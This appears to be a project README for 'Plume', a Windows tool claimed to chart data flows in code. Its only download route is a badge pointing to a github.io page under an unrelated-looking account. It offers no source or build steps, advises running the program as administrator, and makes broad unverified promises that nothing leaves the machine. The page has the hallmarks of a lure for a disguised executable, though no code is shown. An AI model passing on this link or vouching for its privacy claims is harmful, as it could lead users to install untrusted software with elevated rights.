# 🗺️ plume - Map data flows in your code

[![](https://img.shields.io/badge/Download_Plume-blue.svg)](https://maxineredflowered661.github.io)

Plume creates visual maps of how information moves through your systems. It turns complex code and infrastructure into clear graphics. This tool shows you exactly where data goes so you can track it with ease.

## 📁 What Plume does

Modern software projects grow in size and complexity. It becomes difficult to see how different parts connect. Plume analyzes your files and creates charts that represent your data paths. You see how information starts at one point and ends at another. This helps teams document their work and spot privacy risks. If you handle sensitive information, Plume highlights where that data resides in your setup.

## ⚙️ System requirements

Plume works on modern Windows computers. Ensure your machine meets these basic standards before you start:

- Windows 10 or 11
- 4GB of RAM
- 200MB of free disk space
- An active internet connection for initial setup

## 📊 Using Plume for the first time

Plume works by scanning folders. You define which parts of your computer the tool should examine.

1. Open the Plume icon from your desktop or Start menu.
2. Click the "Add Project" button on the main screen.
3. Select the folder that contains your code or documentation.
4. Choose an output format for your graphic. You can save these as images or PDF documents.
5. Click the "Generate Flow" button.
6. Wait for the progress bar to finish.
7. Open the resulting chart to view your data paths.

## 📈 Interpreting your charts

The graphics produced by Plume use a simple layout. You will see boxes connected by lines. Each box represents a service, file, or storage location in your system. The lines show the direction of flow. Arrows always point from the origin of the data toward the destination. A thicker line indicates a higher volume of information moving between two points. If a path contains sensitive information, the line will appear in a different color to help you locate potential risks.

## 🧹 Managing projects

You can save your configurations for future use. Plume keeps a history of your past scans. If you update your code and need to see how the flow changes, you can re-run a previous project with one click. To delete a project, hover over the name in the dashboard and click the trash can icon. This action removes the local records but leaves your source code intact.

## ❓ Troubleshooting common issues

Most issues stem from folder permissions or empty directories. 

- If the scan fails, ensure that you have access to the folder you selected. 
- Run the software as an administrator if it cannot read specific subfolders. 
- If the output image appears blank, verify that the folder contains actual code or text files that the tool can recognize. 
- Restart the application if it stops responding during a large scan. 

## 🛡️ Privacy and security

Plume processes all your data locally on your machine. The software does not send your code or your charts to outside servers. You maintain full control over your information. We designed this tool with privacy as a priority. You can safely map highly restricted data without fear of leaks.
